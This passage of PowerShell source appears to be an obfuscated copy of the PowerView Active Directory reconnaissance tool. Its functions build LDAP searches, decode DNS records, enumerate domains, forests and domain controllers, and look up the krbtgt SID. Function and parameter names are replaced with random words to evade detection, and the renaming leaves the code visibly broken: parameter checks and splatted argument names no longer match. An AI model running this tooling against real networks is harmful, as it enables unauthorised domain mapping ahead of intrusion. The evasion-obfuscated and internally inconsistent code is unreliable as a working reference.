        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $djywXOyM99[$_] = $kaLEgole99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $djywXOyM99[$_] = $kaLEgole99[$_][0] -as $XweWpMuH99
            }
            elseif ($_ -eq 'samaccounttype') {
                $djywXOyM99[$_] = $kaLEgole99[$_][0] -as $HtWQATiZ99
            }
            elseif ($_ -eq 'objectguid') {
                $djywXOyM99[$_] = (New-Object Guid (,$kaLEgole99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $djywXOyM99[$_] = $kaLEgole99[$_][0] -as $CaGOukxX99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $ypPGzzkf99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $kaLEgole99[$_][0], 0
                if ($ypPGzzkf99.Owner) {
                    $djywXOyM99['Owner'] = $ypPGzzkf99.Owner
                }
                if ($ypPGzzkf99.Group) {
                    $djywXOyM99['Group'] = $ypPGzzkf99.Group
                }
                if ($ypPGzzkf99.DiscretionaryAcl) {
                    $djywXOyM99['DiscretionaryAcl'] = $ypPGzzkf99.DiscretionaryAcl
                }
                if ($ypPGzzkf99.SystemAcl) {
                    $djywXOyM99['SystemAcl'] = $ypPGzzkf99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($kaLEgole99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $djywXOyM99[$_] = "NEVER"
                }
                else {
                    $djywXOyM99[$_] = [datetime]::fromfiletime($kaLEgole99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($kaLEgole99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $kaLEgole99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $djywXOyM99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $djywXOyM99[$_] = ([datetime]::FromFileTime(($kaLEgole99[$_][0])))
                }
            }
            elseif ($kaLEgole99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $kaLEgole99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $djywXOyM99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[meridian] error: $_"
                    $djywXOyM99[$_] = $Prop[$_]
                }
            }
            elseif ($kaLEgole99[$_].count -eq 1) {
                $djywXOyM99[$_] = $kaLEgole99[$_][0]
            }
            else {
                $djywXOyM99[$_] = $kaLEgole99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $djywXOyM99
    }
    catch {
        Write-Warning "[meridian] Error parsing LDAP properties : $_"
    }
}



function foaling {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [String]
        $yIIiBVbw99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99 = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $bfrmITkR99 = $XQOKQXGr99

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $tpoFORKS99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $tpoFORKS99) {
                    $XbBBpncp99 = "$($ENV:LOGONSERVER -replace '\\','').$tpoFORKS99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $ldShaVfi99 = philately -ZiReXCQu99 $ZiReXCQu99
            $XbBBpncp99 = ($ldShaVfi99.PdcRoleOwner).Name
            $bfrmITkR99 = $ldShaVfi99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $bfrmITkR99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $bfrmITkR99) {
                $XbBBpncp99 = "$($ENV:LOGONSERVER -replace '\\','').$bfrmITkR99"
            }
        }
        else {
            write-verbose "get-domain"
            $ldShaVfi99 = philately
            $XbBBpncp99 = ($ldShaVfi99.PdcRoleOwner).Name
            $bfrmITkR99 = $ldShaVfi99.Name
        }

        if ($PSBoundParameters['Server']) {
            $XbBBpncp99 = $VmSwBdTN99
        }

        $LMBidOYj99 = 'LDAP://'

        if ($XbBBpncp99 -and ($XbBBpncp99.Trim() -ne '')) {
            $LMBidOYj99 += $XbBBpncp99
            if ($bfrmITkR99) {
                $LMBidOYj99 += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $LMBidOYj99 += $yIIiBVbw99 + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($leCQEaFf99 -Match '^GC://') {
                $DN = $leCQEaFf99.ToUpper().Trim('/')
                $LMBidOYj99 = ''
            }
            else {
                if ($leCQEaFf99 -match '^LDAP://') {
                    if ($leCQEaFf99 -match "LDAP://.+/.+") {
                        $LMBidOYj99 = ''
                        $DN = $leCQEaFf99
                    }
                    else {
                        $DN = $leCQEaFf99.SubString(7)
                    }
                }
                else {
                    $DN = $leCQEaFf99
                }
            }
        }
        else {
            if ($bfrmITkR99 -and ($bfrmITkR99.Trim() -ne '')) {
                $DN = "DC=$($bfrmITkR99.Replace('.', ',DC='))"
            }
        }

        $LMBidOYj99 += $DN
        Write-Verbose "[foaling] search base: $LMBidOYj99"

        if ($ZiReXCQu99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[foaling] Using alternate credentials for LDAP connection"
            $ldShaVfi99 = New-Object DirectoryServices.DirectoryEntry($LMBidOYj99, $ZiReXCQu99.UserName, $ZiReXCQu99.GetNetworkCredential().Password)
            $lASAYQeR99 = New-Object System.DirectoryServices.DirectorySearcher($ldShaVfi99)
        }
        else {
            $lASAYQeR99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$LMBidOYj99)
        }

        $lASAYQeR99.PageSize = $JYnIcwBJ99
        $lASAYQeR99.SearchScope = $YtWADKZe99
        $lASAYQeR99.CacheResults = $False
        $lASAYQeR99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $lASAYQeR99.ServerTimeLimit = $fEdVcXRd99
        }

        if ($PSBoundParameters['Tombstone']) {
            $lASAYQeR99.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $lASAYQeR99.filter = $RUtJqxpA99
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $lASAYQeR99.SecurityMasks = Switch ($iKRjUkvW99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            $oKzgqjMl99 = $kaLEgole99| ForEach-Object { $_.Split(',') }
            $Null = $lASAYQeR99.PropertiesToLoad.AddRange(($oKzgqjMl99))
        }

        $lASAYQeR99
    }
}


function particularities {

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $ujXmPxgV99
    )

    BEGIN {
        function bustles {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$qjKKFjQc99 = $Raw[0]
            [Int]$bMaSAfiS99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($bMaSAfiS99-- -gt 0)
            {
                [Int]$XShPUolm99 = $Raw[$Index++]
                while ($XShPUolm99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        $hdXQjHml99 = [BitConverter]::ToUInt16($ujXmPxgV99, 2)
        $abexRCPe99 = [BitConverter]::ToUInt32($ujXmPxgV99, 8)

        $XrISKfPl99 = $ujXmPxgV99[12..15]

        $Null = [array]::Reverse($XrISKfPl99)
        $TTL = [BitConverter]::ToUInt32($XrISKfPl99, 0)

        $Age = [BitConverter]::ToUInt32($ujXmPxgV99, 20)
        if ($Age -ne 0) {
            $eXItBzfp99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $eXItBzfp99 = '[static]'
        }

        $UuroyxTq99 = New-Object PSObject

        if ($hdXQjHml99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $ujXmPxgV99[24], $ujXmPxgV99[25], $ujXmPxgV99[26], $ujXmPxgV99[27]
            $Data = $IP
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($hdXQjHml99 -eq 2) {
            $rllRfzTu99 = bustles $ujXmPxgV99[24..$ujXmPxgV99.length]
            $Data = $rllRfzTu99
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($hdXQjHml99 -eq 5) {
            $Alias = bustles $ujXmPxgV99[24..$ujXmPxgV99.length]
            $Data = $Alias
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($hdXQjHml99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($ujXmPxgV99[24..$ujXmPxgV99.length]))
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($hdXQjHml99 -eq 12) {
            $Ptr = bustles $ujXmPxgV99[24..$ujXmPxgV99.length]
            $Data = $Ptr
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($hdXQjHml99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($ujXmPxgV99[24..$ujXmPxgV99.length]))
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($hdXQjHml99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($ujXmPxgV99[24..$ujXmPxgV99.length]))
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($hdXQjHml99 -eq 16) {
            [string]$TXT  = ''
            [int]$XShPUolm99 = $ujXmPxgV99[24]
            $Index = 25

            while ($XShPUolm99-- -gt 0) {
                $TXT += [char]$ujXmPxgV99[$index++]
            }

            $Data = $TXT
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($hdXQjHml99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($ujXmPxgV99[24..$ujXmPxgV99.length]))
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($hdXQjHml99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($ujXmPxgV99[24..$ujXmPxgV99.length]))
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($ujXmPxgV99[24..$ujXmPxgV99.length]))
            $UuroyxTq99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $UuroyxTq99 | Add-Member Noteproperty 'UpdatedAtSerial' $abexRCPe99
        $UuroyxTq99 | Add-Member Noteproperty 'TTL' $TTL
        $UuroyxTq99 | Add-Member Noteproperty 'Age' $Age
        $UuroyxTq99 | Add-Member Noteproperty 'TimeStamp' $eXItBzfp99
        $UuroyxTq99 | Add-Member Noteproperty 'Data' $Data
        $UuroyxTq99
    }
}


function floppy {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $xfOIjAld99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $XllioKQk99 = foaling @SearcherArguments

        if ($XllioKQk99) {
            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $XllioKQk99.FindOne()  }
            else { $vDOGrGBR99 = $XllioKQk99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                $Out = meridian -kaLEgole99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[snowboarded] Error disposing of the Results object: $_"
                }
            }
            $XllioKQk99.dispose()
        }

        $xfOIjAld99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $qLojnnqy99 = foaling @SearcherArguments

        if ($qLojnnqy99) {
            try {
                if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $qLojnnqy99.FindOne() }
                else { $vDOGrGBR99 = $qLojnnqy99.FindAll() }
                $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                    $Out = meridian -kaLEgole99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($vDOGrGBR99) {
                    try { $vDOGrGBR99.dispose() }
                    catch {
                        Write-Verbose "[floppy] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[floppy] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $qLojnnqy99.dispose()
        }
    }
}


function midwiferies {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $WCocdydA99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $xfOIjAld99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($WCocdydA99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $SJjMGyvN99 = foaling @SearcherArguments

        if ($SJjMGyvN99) {
            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $SJjMGyvN99.FindOne() }
            else { $vDOGrGBR99 = $SJjMGyvN99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = meridian -kaLEgole99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $WCocdydA99

                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $eGUTPKGN99 = particularities -ujXmPxgV99 $Out.dnsrecord[0]
                    }
                    else {
                        $eGUTPKGN99 = particularities -ujXmPxgV99 $Out.dnsrecord
                    }

                    if ($eGUTPKGN99) {
                        $eGUTPKGN99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[midwiferies] Error: $_"
                    $Out
                }
            }

            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[midwiferies] Error disposing of the Results object: $_"
                }
            }
            $SJjMGyvN99.dispose()
        }
    }
}


function philately {

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[philately] Using alternate credentials for philately'

            if ($PSBoundParameters['Domain']) {
                $bfrmITkR99 = $XQOKQXGr99
            }
            else {
                $bfrmITkR99 = $ZiReXCQu99.GetNetworkCredential().Domain
                Write-Verbose "[philately] Extracted domain '$bfrmITkR99' from -ZiReXCQu99"
            }

            $bzsLDuwG99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $bfrmITkR99, $ZiReXCQu99.UserName, $ZiReXCQu99.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($bzsLDuwG99)
            }
            catch {
                Write-Verbose "[philately] The specified domain '$bfrmITkR99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $bzsLDuwG99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $XQOKQXGr99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($bzsLDuwG99)
            }
            catch {
                Write-Verbose "[philately] The specified domain '$XQOKQXGr99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[philately] Error retrieving the current domain: $_"
            }
        }
    }
}


function Elysium {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $alVFVdbB99 = @{}
        if ($PSBoundParameters['Domain']) { $alVFVdbB99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Credential']) { $alVFVdbB99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $alVFVdbB99['Server'] = $VmSwBdTN99 }

            $alVFVdbB99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Rankine @Arguments
        }
        else {
            $iFQIsXeq99 = philately @Arguments
            if ($iFQIsXeq99) {
                $iFQIsXeq99.DomainControllers
            }
        }
    }
}


function presumably {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CGeRkdBE99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[presumably] Using alternate credentials for presumably"

            if ($PSBoundParameters['Forest']) {
                $jCmysHTh99 = $CGeRkdBE99
            }
            else {
                $jCmysHTh99 = $ZiReXCQu99.GetNetworkCredential().Domain
                Write-Verbose "[presumably] Extracted domain '$CGeRkdBE99' from -ZiReXCQu99"
            }

            $JGupsXoK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $jCmysHTh99, $ZiReXCQu99.UserName, $ZiReXCQu99.GetNetworkCredential().Password)

            try {
                $xAxyYJaM99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($JGupsXoK99)
            }
            catch {
                Write-Verbose "[presumably] The specified forest '$jCmysHTh99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $JGupsXoK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $CGeRkdBE99)
            try {
                $xAxyYJaM99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($JGupsXoK99)
            }
            catch {
                Write-Verbose "[presumably] The specified forest '$CGeRkdBE99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $xAxyYJaM99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($xAxyYJaM99) {
            if ($PSBoundParameters['Credential']) {
                $KbckjXyP99 = (bobcats -aCzrnrLk99 "krbtgt" -XQOKQXGr99 $xAxyYJaM99.RootDomain.Name -ZiReXCQu99 $ZiReXCQu99).objectsid
            }
            else {
                $KbckjXyP99 = (bobcats -aCzrnrLk99 "krbtgt" -XQOKQXGr99 $xAxyYJaM99.RootDomain.Name).objectsid
            }

            $Parts = $KbckjXyP99 -Split '-'
            $KbckjXyP99 = $Parts[0..$($Parts.length-2)] -join '-'
            $xAxyYJaM99 | Add-Member NoteProperty 'RootDomainSid' $KbckjXyP99
            $xAxyYJaM99
        }
    }
}


function decolonize {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CGeRkdBE99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $alVFVdbB99 = @{}
        if ($PSBoundParameters['Forest']) { $alVFVdbB99['Forest'] = $CGeRkdBE99 }
        if ($PSBoundParameters['Credential']) { $alVFVdbB99['Credential'] = $ZiReXCQu99 }

        $xAxyYJaM99 = presumably @Arguments
        if ($xAxyYJaM99) {
            $xAxyYJaM99.Domains
        }
    }
}


function sapsuckers {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CGeRkdBE99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $alVFVdbB99 = @{}
        if ($PSBoundParameters['Forest']) { $alVFVdbB99['Forest'] = $CGeRkdBE99 }
        if ($PSBoundParameters['Credential']) { $alVFVdbB99['Credential'] = $ZiReXCQu99 }

        $xAxyYJaM99 = presumably @Arguments

        if ($xAxyYJaM99) {
            $xAxyYJaM99.FindAllGlobalCatalogs()
        }
    }
}


function scooter {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $MvqXMIWW99,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CGeRkdBE99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $alVFVdbB99 = @{}
        if ($PSBoundParameters['Forest']) { $alVFVdbB99['Forest'] = $CGeRkdBE99 }
        if ($PSBoundParameters['Credential']) { $alVFVdbB99['Credential'] = $ZiReXCQu99 }

        $xAxyYJaM99 = presumably @Arguments

        if ($xAxyYJaM99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($GAxjcCAq99 in $MvqXMIWW99) {
                    $xAxyYJaM99.Schema.FindClass($GAxjcCAq99)
                }
            }
            else {
                $xAxyYJaM99.Schema.FindAllClasses()
            }
        }
    }
}


function strategy {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $MvqXMIWW99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $SlpeaWYH99,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $AzkhARCn99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
